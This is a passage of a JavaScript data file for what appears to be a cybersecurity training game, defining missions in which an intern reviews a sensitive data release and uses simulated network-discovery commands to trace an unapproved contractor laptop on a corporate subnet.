          analyst: 'Draft acquisition roadmap (targets, valuation ranges, timeline) — unannounced, market-sensitive material.',
          technical: 'acquisition_roadmap.txt — PROJECT NORTHSTAR target shortlist + valuation ranges through 2027. Material non-public information. Classification: Confidential.',
          terms: ['materialNonPublic', 'confidential'],
        },
      },
      {
        id: 'ev_contractor_access', label: 'Contractor account read HR/Finance files outside its remit.',
        qualityWeight: 3, source: 'access_log.txt', setFlag: 'contractorAccessDiscovered',
        layers: {
          beginner: {
            summary: 'The outside contractor'+"'"+'s account opened private HR and Finance files in the middle of the night.',
            why: 'An outside account reading files that have nothing to do with its job — at 2 in the morning — is unusual and worth a closer look.',
            prompt: 'Does this look like normal work, or something to flag?',
          },
          analyst: 'Vendor account ext-contractor-07 accessed HR/Finance files (salaries, payment records, roadmap) at ~02:00 — outside its expected scope.',
          technical: 'access_log.txt — ext-contractor-07 read employee_salaries.csv, customer_payment_records.csv, acquisition_roadmap.txt between 02:14–02:21. Vendor account active off-hours, outside its remit.',
          terms: [],
        },
        reflection: {
          title: 'REVIEW THE SUSPICIOUS ACTIVITY',
          prompt: 'What concerns you about this activity? (Tick anything that stands out.)',
          concerns: [
            'An outside contractor account opened private files',
            'The files were opened in the middle of the night',
            'The files were outside the contractor'+"'"+'s normal work',
            'This looks like normal release preparation',
            'I need more information before deciding',
          ],
          judgmentPrompt: 'Based on what you found, how would you judge this activity?',
          feedback: 'There is no single right answer here — analysts reason from what they observe. Noticing WHO touched the data, WHEN, and whether it fits their job is exactly the kind of thinking that catches a problem early.',
        },
      },
    ],

    /* ---- DECISION: handling actions (each moves >=3 of 6 resources) ---- */
    actions: [
      {
        id: 'approve_release',
        type: 'direct',
        label: 'Approve Release',
        summary: 'Send the folder to the partner as requested.',
        outcomeSub: 'You authorized the external release.',
        deltas: { complianceExposure: 35, executiveTrust: -20, careerReputation: -15, securityPosture: -25, businessContinuity: 3, organizationBudget: -15000 },
        setFlags: ['sensitiveDataExposed', 'contractorAccessIgnored'],
        consequence: {
          immediate: ['Restricted employee and customer records left the building in the release package.'],
          business: ['Regulatory breach-notification obligations triggered.', 'HR and Legal investigations opened.'],
          future: ['Future missions carry legal and regulatory scrutiny.'],
        },
      },
      {
        id: 'restrict_access',
        type: 'direct',
        label: 'Restrict Access',
        summary: 'Lock the folder down and block the external release.',
        outcomeSub: 'You restricted access to the folder.',
        deltas: { securityPosture: 15, complianceExposure: -10, businessContinuity: -8, careerReputation: 8 },
        setFlags: [],
        consequence: {
          immediate: ['External release halted; sensitive files restricted to authorized roles.'],
          business: ['Partner deliverable delayed pending reclassification. No data exposed.'],
          future: ['A clean handling record strengthens later recommendations.'],
        },
      },
      {
        id: 'recommend_legal',
        type: 'recommendation',
        label: 'Recommend Legal Review',
        summary: 'Ask Legal to review the contractor access and the release.',
        outcomeSub: 'You recommended a legal review.',
        deltas: { complianceExposure: -15, executiveTrust: 8, careerReputation: 10, businessContinuity: -5, organizationBudget: -5000 },
        setFlags: ['legalReviewTriggered'],
        deniedNote: 'Leadership declined the legal review for now; the contractor access remains unreviewed.',
        consequence: {
          immediate: ["Legal engaged to review the contractor's data access and the proposed release."],
          business: ['Release paused pending legal guidance; exposure contained early.'],
          future: ['Legal is now tracking this contractor — useful in later missions.'],
        },
      },
      {
        id: 'archive',
        type: 'direct',
        label: 'Archive',
        summary: 'Archive the folder; cancel the external transfer.',
        outcomeSub: 'You archived the release folder.',
        deltas: { businessContinuity: -3, securityPosture: 6, complianceExposure: -5, careerReputation: 2 },
        setFlags: ['contractorAccessIgnored'],
        consequence: {
          immediate: ['Release folder archived; no external transfer occurred.'],
          business: ['Partner deliverable stalled, but no risk taken.'],
          future: ['Conservative call — safe, if not decisive.'],
        },
      },
      {
        id: 'escalate',
        type: 'recommendation',
        label: 'Escalate',
        summary: 'Escalate to your SOC Lead with your findings.',
        outcomeSub: 'You escalated to leadership.',
        deltas: { executiveTrust: 10, careerReputation: 8, businessContinuity: -2, complianceExposure: -8, securityPosture: 3 },
        setFlags: [],
        deniedNote: 'Leadership sent it back — they want stronger findings before acting.',
        consequence: {
          immediate: ['Escalated to SOC Lead with classification findings and the access-log evidence.'],
          business: ['Senior review engaged; the decision sits with the right authority.'],
          future: ['Acting within your authority builds trust for bigger calls later.'],
        },
      },
    ],

    /* ---- LOCKED AUTHORITY: explain why, offer a recommendation instead ---- */
    lockedActions: [
      {
        id: 'change_policy',
        label: 'Change Data-Handling Policy',
        reason: 'Cybersecurity Interns do not have authority to change data-handling policy. Policy changes require a Security Manager or above.',
        alternativeRecommendationId: 'rec_policy_review',
      },
      {
        id: 'exec_approval',
        label: 'Direct Executive Approval',
        reason: 'Cybersecurity Interns cannot grant executive approvals or engage executives directly. Route this through your SOC Lead.',
        alternativeRecommendationId: 'rec_escalate',
      },
    ],

    /* ---- RECOMMENDATIONS offered as alternatives to locked actions ---- */
    recommendations: {
      rec_policy_review: {
        label: 'Policy Review',
        deltas: { complianceExposure: -8, executiveTrust: 5, careerReputation: 6 },
        setFlags: [],
        deniedNote: 'Leadership declined to open a policy review without stronger evidence.',
        consequence: {
          immediate: ['Policy review requested for contractor data access.'],
          business: ['Data-handling policy gaps flagged to leadership.'],
          future: ['Tighter policy reduces future exposure.'],
        },
      },
      rec_escalate: {
        label: 'Incident Escalation',
        deltas: { executiveTrust: 8, careerReputation: 6, complianceExposure: -6 },
        setFlags: [],
        deniedNote: 'Leadership bounced the escalation back for more detail.',
        consequence: {
          immediate: ['Incident escalated to leadership for an authority decision.'],
          business: ['Senior staff now own the release call.'],
          future: ['Escalation history noted for later missions.'],
        },
      },
    },
  },

  /* ================================================================== *
   * MISSION 2 — Investigate Network Assets (COMMAND-MODEL)
   * Asset discovery on the corporate subnet: find the one device that is
   * not in the inventory, work out what it is and who put it there, and
   * recommend a response. Behavior before terminology — the player runs
   * real commands and reasons from what they see; terms are introduced as
   * glossary chips, never quizzed.
   * ================================================================== */
  'mission-002': {
    id: 'mission-002',
    opId: 'OPS-2026-002',
    severity: 'MEDIUM',
    region: 'APAC REGION',
    title: 'Investigate Network Assets',
    threatClass: 'Network Fundamentals & Asset Discovery',
    priority: 'P3 — MEDIUM',
    promptLabel: 'intern@cybercorp:~/netops$',
    carryFlags: [
      { key: 'rogueDeviceActive',     label: 'Unapproved device left active on the network' },
      { key: 'rogueDeviceContained',  label: 'Unapproved device disconnected / contained' },
      { key: 'contractorDeviceLinked', label: 'Unapproved device linked to a contractor' },
    ],
    supervisorMemory: [
      { when: { allOf: ['legalReviewTriggered'] }, tone: 'good',
        text: "Looping Legal in on that contractor in your first case was the right call — that paper trail is already paying off. Bring the same instinct here." },
      { when: { allOf: ['sensitiveDataExposed'] }, tone: 'bad',
        text: "We're still cleaning up the records that left the building on your first case. Be deliberate this time — no second incident." },
      { when: { allOf: ['contractorAccessIgnored'], noneOf: ['legalReviewTriggered'] }, tone: 'warn',
        text: "The contractor access from your first case never got a real review. If that thread resurfaces here, don't let it slide twice." },
      { when: { noneOf: ['legalReviewTriggered', 'sensitiveDataExposed', 'contractorAccessIgnored'] }, tone: 'good',
        text: "Clean handling on the release review last case. Keep that standard here." },
    ],
    notebook: {
      hypotheses: [
        { label: 'The unknown host on the CORP segment is an unauthorized device, not a sanctioned asset.', triggeredBy: ['ev_unknown_host', 'ev_not_in_inventory'] },
        { label: 'The device belongs to the contractor already flagged in the release case.', triggeredBy: ['ev_notes_contractor', 'ev_contractor_device'] },
        { label: 'The device is actively reaching for Finance data, not sitting idle.', triggeredBy: ['ev_probe', 'ev_open_services'] },
      ],
      unknowns: [
        { label: 'Is the unknown host actually live on the network right now?', resolvedBy: ['ev_host_live'] },
        { label: 'Who owns the device, and are they authorized to be here?', resolvedBy: ['ev_contractor_device', 'ev_lease'] },
        { label: 'Is it on the internal CORP segment or isolated on guest?', resolvedBy: ['ev_segment'] },
      ],
    },
    evidenceEmpty: 'No evidence yet. Use the terminal to map the network — each command can surface a new finding.',
    risks: [
      { id: 'risk_unknown_device',   label: 'An unapproved device is connected to the corporate network', triggeredBy: ['ev_unknown_host', 'ev_not_in_inventory'] },
      { id: 'risk_services_open',    label: 'The unknown device is running open network services', triggeredBy: ['ev_open_services'] },
      { id: 'risk_sensitive_segment',label: 'The device sits on the internal finance segment, not guest', triggeredBy: ['ev_segment'] },
      { id: 'risk_finance_probe',    label: 'The device has been reaching for the finance file share', triggeredBy: ['ev_probe'] },
      { id: 'risk_contractor_device',label: 'A contractor connected a personal, unmanaged device', triggeredBy: ['ev_contractor_device'] },
    ],
    identify: {
      head: 'YOUR DETERMINATION',
      prompt: 'Which device is the unapproved one that does not belong on this network?',
      reviewLabel: 'Unapproved device',
      note: 'Determination recorded — this is the device your recommendation will act on.',
      correctId: 'dev_57',
      options: [
        { id: 'dev_10', label: '192.168.1.10 — file server (in inventory)' },
        { id: 'dev_20', label: '192.168.1.20 — finance laptop (in inventory)' },
        { id: 'dev_34', label: '192.168.1.34 — your workstation' },
        { id: 'dev_57', label: '192.168.1.57 — unknown host' },
      ],
    },

    // Reactive device map (Task #94) — review-only. Nodes/links start hidden or
    // neutral and reveal/flag as the terminal surfaces evidence. Nothing here is
    // persisted or scored; `dev_57` only turns "suspicious" once the player has
    // actually surfaced the evidence that proves it (behaviour before terminology).
    map: {
      cap: 'CORP SEGMENT · 192.168.1.0/24 — APAC OFFICE',
      hint: 'Every device is mapped. Red marks the unapproved host and what it has been reaching for. Select any node or connection for analyst intel.',
      nodes: {
        gateway: {
          x: 50, y: 14, glyph: '🔀', label: '192.168.1.1', sub: 'gateway / router', seed: true,
          intel: {
            what: 'The office router that ties every device on the 192.168.1.0/24 subnet together.',
            technique: 'Read your own interface config (ip addr) to learn the subnet and its gateway.',
            why: 'Everything on this subnet routes through here — it defines who can reach whom.' },
        },
        you: {
          x: 16, y: 46, glyph: '💻', label: '192.168.1.34', sub: 'your workstation', seed: true, status: 'self',
          intel: {
            what: 'Your own SOC analyst workstation — an approved, inventoried device.',
            technique: 'ip addr shows your address and confirms which subnet you are investigating from.',
            why: 'Knowing your own position is the anchor point for mapping everything else.' },
        },
        fileserver: {
          x: 36, y: 84, glyph: '🗄️', label: '192.168.1.10', sub: 'file server',
          revealBy: 'ev_unknown_host', statusBy: { ev_probe: 'target' },
          intel: {
            what: 'The APAC file server — an approved, inventoried device holding shared files.',
            technique: 'A subnet scan (nmap 192.168.1.0/24) lists it; the asset inventory confirms it is approved.',
            why: 'It is a sensitive asset. If an unapproved device is reaching for it, that matters.' },
        },
        finance: {
          x: 64, y: 84, glyph: '💰', label: '192.168.1.20', sub: 'finance laptop',
          revealBy: 'ev_unknown_host', statusBy: { ev_probe: 'target' },
          intel: {
            what: 'The finance laptop — an approved device that handles sensitive financial data.',
            technique: 'Discovered by the subnet scan and confirmed against the approved asset inventory.',
            why: 'Finance data is a prime target. Watch what tries to connect to it.' },
        },
        unknown: {
          x: 86, y: 48, glyph: '❓', label: '192.168.1.57', sub: 'unidentified host',
          revealBy: 'ev_unknown_host', status: 'unknown', statusBy: { ev_not_in_inventory: 'suspicious' },
          intel: {
            what: 'An extra host with no reverse name that is not on the approved inventory — later traced to contractor J. Demir\u2019s personal laptop.',
            technique: 'Cross-reference the scan against the inventory, then pivot through DHCP leases and contractor records to attribute it.',
            why: 'An unapproved, unmanaged device on the internal segment — reaching for finance shares — is the core of this incident.' },
        },
      },
      links: [
        { a: 'you', b: 'gateway', revealBy: 'ev_subnet',
          intel: {
            what: 'Your workstation sits on the 192.168.1.0/24 subnet through this gateway.',
            technique: 'ip addr reveals your address and subnet mask.',
            why: 'It establishes the shared network every other device also lives on.' } },
        { a: 'fileserver', b: 'gateway', revealBy: 'ev_unknown_host',
          intel: {
            what: 'The file server is live on the same subnet.',
            technique: 'Subnet sweep (nmap 192.168.1.0/24).',
            why: 'Confirms a sensitive asset shares the segment with every other host.' } },
        { a: 'finance', b: 'gateway', revealBy: 'ev_unknown_host',
          intel: {
            what: 'The finance laptop is live on the same subnet.',
            technique: 'Subnet sweep (nmap 192.168.1.0/24).',
            why: 'Another sensitive asset on the shared segment.' } },
        { a: 'unknown', b: 'gateway', revealBy: 'ev_unknown_host',
          intel: {
            what: 'The unidentified host is on the same internal subnet as everything else.',
            technique: 'Subnet sweep (nmap 192.168.1.0/24).',
            why: 'Same-subnet reachability means it can attempt to reach the file server and finance laptop directly.' } },
        { a: 'unknown', b: 'fileserver', revealBy: 'ev_probe', danger: true,
          intel: {
            what: 'Repeated connection attempts from .57 to the file server\u2019s file-sharing port (445), all denied.',
            technique: 'Read the network event log (tail network_events.log).',
            why: 'An unapproved device actively probing a sensitive share is reconnaissance, not idle presence.' } },
        { a: 'unknown', b: 'finance', revealBy: 'ev_probe', danger: true,
          intel: {
            what: 'Repeated connection attempts from .57 to the finance laptop\u2019s file-sharing port (445), all denied.',
            technique: 'Read the network event log (tail network_events.log).',
            why: 'Reaching specifically for finance assets sharpens the device from "unapproved" to "concerning".' } },
      ],
    },

    intro: [
      { t: 'CyberCorp SOC // Career Operating Center — Network Asset Review', c: 'head' },
      { t: 'A monitoring alert says a device on the office network does not match the', c: 'dim' },
      { t: 'asset inventory. Map the network, find the odd one out, and decide what to do.', c: 'dim' },
      { t: 'Type  ip addr  to see your own address, then  help  for the full command list.', c: 'dim' },
    ],
    brief: {
      situation:
        'The APAC office network threw a low-priority alert: the count of active ' +
        'devices is higher than the approved asset inventory. Probably nothing — a ' +
        'phone, a test box. But "probably nothing" is still worth ten minutes. Map ' +
        'what is actually on the network, compare it to what is supposed to be there, ' +
        'and figure out the device that does not belong.',
      objectives: [
        'Discover the devices active on the office subnet',
        'Compare them against the approved asset inventory',
        'Identify the device that is not authorized',
        'Work out what it is and who connected it — then recommend a response',
      ],
      managerNote:
        '"Network housekeeping, mostly. But you remember that contractor from the data ' +
        'review? Keep your eyes open — unknown hardware on an internal segment is how ' +
        'small problems get big. Recommend, don'+"'"+'t reconfigure. — Sarah Reyes, SOC Lead"',
    },

    commands: [
      {
        id: 'ip_addr',
        match: ['ip addr', 'ipaddr', 'ifconfig'],
        help: 'show your own machine'+"'"+'s network address',
        core: true,
        output: [
          { t: 'eth0:  inet 192.168.1.34/24  brd 192.168.1.255', c: 'file' },
          'You are host 192.168.1.34 on subnet 192.168.1.0/24 (the office LAN).',
        ],
        reveals: ['ev_subnet'],
        observation: 'You and every office device share the 192.168.1.0/24 subnet — they can all reach each other.',
        question: 'If a stranger'+"'"+'s device joined this same subnet, what could it reach?',
        next: 'scan the whole subnet to see who else is online — type  nmap 192.168.1.0/24',
      },
      {
        id: 'nmap_subnet',
        match: ['nmap 192.168.1.0/24', 'nmap subnet', 'nmap 192.168.1.0'],
        help: 'scan the subnet to discover active devices',
        core: true,
        output: [
          { t: 'Nmap scan report — 192.168.1.0/24  (5 hosts up)', c: 'head' },
          '  192.168.1.1    up    gateway/router',
          '  192.168.1.10   up    fileserver-apac',
          '  192.168.1.20   up    finance-laptop-apac',
          '  192.168.1.34   up    your-workstation',
          '  192.168.1.57   up    (no reverse name)',
        ],
        reveals: ['ev_unknown_host'],
        observation: '192.168.1.57 answers, but unlike the others it has no recognizable name.',
        question: 'Four hosts you can name, one you cannot — which one deserves a closer look?',
        next: 'check it against the official list — type  cat asset_inventory.txt',
      },
      {
        id: 'asset_inventory',
        match: ['cat asset_inventory.txt', 'cat asset_inventory', 'less asset_inventory.txt'],
        help: 'read the approved device inventory',
        core: true,
        output: [
          { t: 'asset_inventory.txt — APPROVED DEVICES (APAC office)', c: 'head' },
          '  192.168.1.1    gateway/router        IT',
          '  192.168.1.10   fileserver-apac       IT',
          '  192.168.1.20   finance-laptop-apac   Finance',
          '  192.168.1.34   intern-workstation    SOC (you)',
          '  # Every approved device is listed here. Nothing else should be online.',
        ],
        reveals: ['ev_not_in_inventory'],
        observation: '192.168.1.57 is NOT in the approved inventory — every other live host is.',
        question: 'A device on the network that nobody approved — is that a mistake, or something more?',
        next: 'confirm it is really there and reachable — type  ping 192.168.1.57',
      },
      {
        id: 'ping_57',
        match: ['ping 192.168.1.57', 'ping 57'],
        help: 'check whether the unknown host is alive',
        output: [
          '64 bytes from 192.168.1.57: icmp_seq=1 ttl=64 time=0.8 ms',
          '64 bytes from 192.168.1.57: icmp_seq=2 ttl=64 time=0.7 ms',
          '--- 192.168.1.57 ping statistics: 0% packet loss ---',
        ],
        reveals: ['ev_host_live'],
        observation: 'It responds instantly — this is a real, powered-on device sitting on the LAN right now.',
        question: 'It is live and active. What is it actually running?',
        next: 'scan just this host for open services — type  nmap 192.168.1.57',
      },
      {
        id: 'nmap_host',
        match: ['nmap 192.168.1.57', 'nmap 57'],
        help: 'scan the unknown host for open services',
        core: true,
        output: [
          { t: 'Nmap scan report — 192.168.1.57', c: 'head' },
          '  PORT     STATE  SERVICE',
          '  22/tcp   open   ssh        (remote login)',
          '  445/tcp  open   smb        (file sharing)',
          '  8080/tcp open   http-proxy',
          '  OS guess: generic Linux laptop',
        ],
        reveals: ['ev_open_services'],
        observation: 'The unknown device is exposing remote-login and file-sharing services — not a passive gadget.',
        question: 'Why would an unmanaged device be offering file sharing on the office network?',
        next: 'see when and how it joined — type  cat dhcp_leases.txt',
      },
      {
        id: 'dhcp_leases',
        match: ['cat dhcp_leases.txt', 'cat dhcp_leases', 'less dhcp_leases.txt'],
        help: 'read recent DHCP address assignments',
        output: [
          { t: 'dhcp_leases.txt — recent address handouts', c: 'head' },
          '  192.168.1.57   mac a4:83:e7:1c:9b:22   host "DEMIR-LAPTOP"   leased 2 days ago',
          '  mac vendor lookup: a4:83:e7  →  Apple, Inc. (personal-class hardware)',
        ],
        reveals: ['ev_lease'],
        observation: 'The lease names the device "DEMIR-LAPTOP" — a personal laptop that joined just two days ago.',
        question: 'A personal laptop named after someone — who, and were they allowed to plug in?',
        next: 'search the network notes for that address — type  grep 192.168.1.57 network_notes.txt',
      },
      {
        id: 'grep_notes',
        match: ['grep 192.168.1.57 network_notes.txt', 'grep 192.168.1.57', 'grep 57 network_notes.txt'],
        help: 'search the network notes for the unknown host',
        output: [
          'network_notes.txt:  "1.57 showed up this week — someone said it'+"'"+'s a contractor'+"'"+'s own laptop?"',
          'network_notes.txt:  "not ticketed, not imaged by IT. flagged for follow-up."',
        ],
        reveals: ['ev_notes_contractor'],
        observation: 'An informal note already suspected 1.57 is a contractor'+"'"+'s personal laptop — never ticketed or managed by IT.',
        question: 'Which contractor, and is this the same one from the data-handling review?',
        next: 'check the contractor assignments — type  cat contractor_assignments.txt',
      },
      {
        id: 'contractor_assignments',
        match: ['cat contractor_assignments.txt', 'cat contractor_assignments', 'less contractor_assignments.txt'],
        help: 'read the active contractor assignments',
        core: true,
        output: [
          { t: 'contractor_assignments.txt — active vendors', c: 'head' },
          '  ext-contractor-07   J. Demir   Logistics integration   device policy: COMPANY-ISSUED ONLY',
          '  # Personal devices are NOT permitted on internal segments. Vendors use the guest network.',
        ],
        reveals: ['ev_contractor_device'],
        observation: 'The laptop belongs to J. Demir — the same contractor account flagged in the data-handling case — and personal devices are barred from internal segments.',
        question: 'The same contractor, now with unmanaged hardware on the internal network — coincidence?',
        next: 'see where on the network it actually sits — type  cat network_diagram.txt',
      },
      {
        id: 'network_diagram',
        match: ['cat network_diagram.txt', 'cat network_diagram', 'less network_diagram.txt'],
        help: 'read the network segment diagram',
        output: [
          { t: 'network_diagram.txt — segments', c: 'head' },
          '  GUEST  192.168.9.0/24   visitors, contractors (isolated, no internal access)',
          '  CORP   192.168.1.0/24   staff + finance + file server   ← 192.168.1.57 is HERE',
          '  # Contractor devices belong on GUEST. 1.57 is on CORP, beside the finance laptop.',
        ],
        reveals: ['ev_segment'],
        observation: 'The device is on the CORP segment next to Finance — exactly where a contractor laptop should never be.',
        question: 'On the guest network it could reach nothing internal. On CORP, what can it reach?',
        next: 'check policy for unknown devices — type  cat security_baseline.txt',
      },
      {
        id: 'security_baseline',
        match: ['cat security_baseline.txt', 'cat security_baseline', 'less security_baseline.txt'],
        help: 'read the device security baseline policy',
        output: [
          { t: 'security_baseline.txt — device policy', c: 'head' },
          '  - Only inventoried, IT-managed devices may join the CORP segment.',
          '  - Unknown or personal devices must be disconnected and escalated, not left to "monitor".',
        ],
        reveals: ['ev_policy'],
        observation: 'Policy is explicit: an unknown device on CORP is disconnected and escalated — not watched.',
        question: 'You now have the rule and the violation. What is the correct response?',
        next: 'check what the device has been doing — type  tail network_events.log',
      },
      {
        id: 'network_events',
        match: ['tail network_events.log', 'cat network_events.log', 'less network_events.log'],
        help: 'read the most recent network events',
        core: true,
        output: [
          { t: 'network_events.log — last entries', c: 'head' },
          '  192.168.1.57 → 192.168.1.10:445  connection attempt (file server)  DENIED',
          '  192.168.1.57 → 192.168.1.20:445  connection attempt (finance laptop)  DENIED',
          '  192.168.1.57 → 192.168.1.10:445  retry  DENIED',
        ],
        reveals: ['ev_probe'],
        observation: 'The unknown laptop has been repeatedly reaching for the finance file share — not idle, actively probing.',
        question: 'A barred personal device probing finance shares — does that wait, or does it move now?',
        next: 'you have the full picture — type  decide  to choose your response',
      },
    ],

    evidence: [
      {
        id: 'ev_subnet', label: 'You and every office device share one subnet (192.168.1.0/24).',
        qualityWeight: 1, source: 'ip addr',
        layers: {
          beginner: {
            summary: 'Your computer and all the office devices are on the same shared network.',
            why: 'Devices on the same network can usually reach each other directly.',
            prompt: 'If a stranger'+"'"+'s laptop joined this same network, what might it be able to reach?',
          },
          analyst: 'Local host 192.168.1.34/24; all office assets share the 192.168.1.0/24 broadcast domain.',
          technical: 'eth0 inet 192.168.1.34/24, brd 192.168.1.255 — flat L2 segment, intra-subnet reachability by default.',
          terms: ['network', 'subnet', 'ipAddress'],
        },
      },
      {
        id: 'ev_unknown_host', label: 'An extra host (192.168.1.57) is online with no recognizable name.',
        qualityWeight: 2, source: 'nmap 192.168.1.0/24',
        layers: {
          beginner: {
            summary: 'A scan of the network found one extra device that does not have a normal name.',
            why: 'Company devices have known names; an unnamed one nobody recognizes stands out.',
            prompt: 'Four devices you can name and one you cannot — which deserves attention?',
          },
          analyst: 'Subnet sweep returns 5 live hosts; 192.168.1.57 has no reverse DNS and no asset mapping.',
          technical: 'nmap -sn 192.168.1.0/24 — 192.168.1.57 up, no PTR record, unmatched to inventory.',
          terms: ['network', 'device'],
        },
      },
      {
        id: 'ev_not_in_inventory', label: '192.168.1.57 is NOT in the approved asset inventory.',
        qualityWeight: 3, source: 'asset_inventory.txt',
        layers: {
          beginner: {
            summary: 'The official list of allowed devices does not include 192.168.1.57.',
            why: 'If a device is on the network but not on the approved list, nobody signed off on it being there.',
            prompt: 'A device nobody approved is connected — mistake, or something worse?',
          },
          analyst: 'Asset inventory enumerates .1/.10/.20/.34; 192.168.1.57 is unaccounted for — an unmanaged asset.',
          technical: 'asset_inventory.txt baseline excludes 192.168.1.57; device is non-inventoried / unauthorized.',
          terms: ['device', 'ipAddress'],
        },
      },
      {
        id: 'ev_host_live', label: 'The unknown host is powered on and responding right now.',
        qualityWeight: 1, source: 'ping 192.168.1.57',
        layers: {
          beginner: {
            summary: 'The unknown device answers immediately — it is switched on and active.',
            why: 'This is not a stale record; it is a real device on the network at this moment.',
            prompt: 'It is live. The next question is — what is it running?',
          },
          analyst: 'ICMP echo to 192.168.1.57 — 0% loss, sub-ms RTT; host active on-segment.',
          technical: 'ping 192.168.1.57 — replies ttl=64, 0% packet loss; device live.',
          terms: ['device'],
        },
      },
      {
        id: 'ev_open_services', label: 'The unknown device exposes remote-login and file-sharing services.',
        qualityWeight: 2, source: 'nmap 192.168.1.57',
        layers: {
          beginner: {
            summary: 'The device is offering ways to log in remotely and share files.',
            why: 'An unmanaged device offering these services is a door an attacker could push on.',
            prompt: 'Why would a personal laptop be offering file sharing on the office network?',
          },
          analyst: 'Host scan: 22/ssh, 445/smb, 8080/http open — interactive + file-share exposure on an unmanaged host.',
          technical: 'nmap 192.168.1.57 — open 22 (ssh), 445 (smb), 8080 (http-proxy); unmanaged endpoint exposing services.',
          terms: ['service', 'portScan'],
        },
      },
      {
        id: 'ev_lease', label: 'The device is a personal laptop ("DEMIR-LAPTOP") that joined 2 days ago.',
        qualityWeight: 2, source: 'dhcp_leases.txt',
        layers: {
          beginner: {
            summary: 'Records show the device is a personal laptop that connected just two days ago.',
            why: 'A brand-new personal device on the company network, named after a person, is worth tracing.',
            prompt: 'Whose laptop is it, and were they allowed to plug it in here?',
          },
          analyst: 'DHCP lease: 192.168.1.57 → MAC a4:83:e7:1c:9b:22 (Apple), hostname DEMIR-LAPTOP, age ~48h.',
          technical: 'dhcp_leases.txt — recent lease, OUI a4:83:e7 = Apple; hostname DEMIR-LAPTOP; personal-class device.',
          terms: ['device'],
        },
      },
      {
        id: 'ev_notes_contractor', label: 'Network notes already suspected 1.57 is a contractor'+"'"+'s personal laptop.',
        qualityWeight: 2, source: 'network_notes.txt',
        layers: {
          beginner: {
            summary: 'Someone had already jotted down that 1.57 looked like a contractor'+"'"+'s own laptop.',
            why: 'It was noticed but never ticketed or checked by IT — it slipped through.',
            prompt: 'Which contractor — and is it the same one from the earlier review?',
          },
          analyst: 'Informal note ties 192.168.1.57 to a contractor-owned device; never ticketed or IT-imaged.',
          technical: 'network_notes.txt — unmanaged contractor device suspicion, no change ticket, flagged-for-follow-up only.',
          terms: [],
        },
      },
      {
        id: 'ev_contractor_device', label: 'The laptop belongs to contractor J. Demir; personal devices are barred from internal segments.',
        qualityWeight: 3, source: 'contractor_assignments.txt', setFlag: 'contractorDeviceLinked',
        layers: {
          beginner: {
            summary: 'The laptop belongs to contractor J. Demir — and contractors are not allowed to use personal devices here.',
            why: 'It is the same contractor from the data-handling case, now with an unapproved device on the internal network.',
            prompt: 'The same contractor again, this time with unmanaged hardware — coincidence?',
          },
          analyst: 'Device owner = J. Demir (ext-contractor-07); policy = company-issued only, vendors on guest segment.',
          technical: 'contractor_assignments.txt — ext-contractor-07 (J. Demir), device-policy COMPANY-ISSUED-ONLY; personal device on CORP = violation.',
          terms: ['device'],
        },
        reflection: {
          title: 'REVIEW THE UNAPPROVED DEVICE',
          prompt: 'What concerns you about this device? (Tick anything that stands out.)',
          concerns: [
            'It is not on the approved inventory',
            'It belongs to an outside contractor, on personal hardware',
            'It is on the internal finance segment, not the guest network',
            'It has been reaching for the finance file share',
            'This looks like a harmless mistake',
            'I need more information before deciding',
          ],
          judgmentPrompt: 'Based on what you found, how would you judge this device?',
          feedback: 'There is no single right answer — analysts reason from what they see. WHO owns it, WHERE it sits, and WHAT it is reaching for together tell you how much this matters.',
        },
      },
      {
        id: 'ev_segment', label: 'The device sits on the internal CORP segment beside Finance, not on guest.',
        qualityWeight: 3, source: 'network_diagram.txt',
        layers: {
          beginner: {
            summary: 'The device is plugged into the internal part of the network, right next to the finance computer.',
            why: 'Contractor devices are supposed to be on a separate guest network with no internal access.',
            prompt: 'On guest it could reach nothing internal. On this segment, what can it reach?',
          },
          analyst: '192.168.1.57 resides on CORP (192.168.1.0/24) adjacent to Finance, not the isolated GUEST segment.',
          technical: 'network_diagram.txt — CORP vs GUEST segmentation; 192.168.1.57 misplaced on CORP, bypassing guest isolation.',
          terms: ['network', 'subnet'],
        },
      },
      {
        id: 'ev_policy', label: 'Policy: unknown devices on CORP must be disconnected and escalated, not monitored.',
        qualityWeight: 1, source: 'security_baseline.txt',
        layers: {
          beginner: {
            summary: 'The rules say an unknown device on the internal network must be removed and reported.',
            why: 'Knowing the policy turns a hunch into a clear, defensible action.',
            prompt: 'You have the rule and the violation — what is the correct response?',
          },
          analyst: 'Baseline mandates disconnect + escalate for non-inventoried CORP devices; "monitor" is non-compliant.',
          technical: 'security_baseline.txt — unmanaged CORP endpoints: quarantine/disconnect + escalate per policy.',
          terms: [],
        },
      },
      {
        id: 'ev_probe', label: 'The device has repeatedly tried to reach the finance file share.',
        qualityWeight: 3, source: 'network_events.log',
        layers: {
          beginner: {
            summary: 'The unknown laptop keeps trying to connect to the finance file-sharing service.',
            why: 'A device that should not be here, repeatedly reaching for finance data, is actively probing — not idle.',
            prompt: 'A barred device probing finance shares — does that wait, or does it get handled now?',
          },
          analyst: 'Repeated 192.168.1.57 → :445 attempts against fileserver + finance laptop, all denied — active enumeration.',
          technical: 'network_events.log — 192.168.1.57 SMB (445) connection attempts to .10/.20, DENIED, retried; lateral-probe behavior.',
          terms: ['service'],
        },
      },
    ],

    actions: [
      {
        id: 'recommend_disconnect',
        type: 'recommendation',
        label: 'Recommend Disconnect',
        summary: 'Recommend the unapproved device be disconnected and quarantined from the network.',
        outcomeSub: 'You recommended disconnecting the unapproved device.',
        deltas: { securityPosture: 18, complianceExposure: -12, businessContinuity: -4, executiveTrust: 8, careerReputation: 10 },
        setFlags: ['rogueDeviceContained'],
        deniedNote: 'Leadership held off on disconnecting — they want firmer evidence the device is unauthorized first.',
        consequence: {
          immediate: ['Network team quarantines 192.168.1.57; its probing of the finance share stops.'],
          business: ['The contractor loses informal network access until properly provisioned on guest. Minor friction, no exposure.'],
          future: ['A clean containment record strengthens your later recommendations.'],
        },
      },
      {
        id: 'monitor',
        type: 'direct',
        label: 'Monitor',
        summary: 'Leave the device online and keep watching its traffic for now.',
        outcomeSub: 'You chose to monitor the device rather than remove it.',
        deltas: { securityPosture: -6, complianceExposure: 8, businessContinuity: 2, careerReputation: -4, executiveTrust: -2 },
        setFlags: ['rogueDeviceActive'],
        consequence: {
          immediate: ['The unapproved device stays on the internal segment, still reaching for finance shares.'],
          business: ['Policy says unknown CORP devices are disconnected, not watched — this leaves exposure open.'],
          future: ['An uncontained device on record raises scrutiny on later missions.'],
        },
      },
      {
        id: 'escalate',
        type: 'recommendation',
        label: 'Escalate',
        summary: 'Escalate the unknown device to your SOC Lead with your findings.',
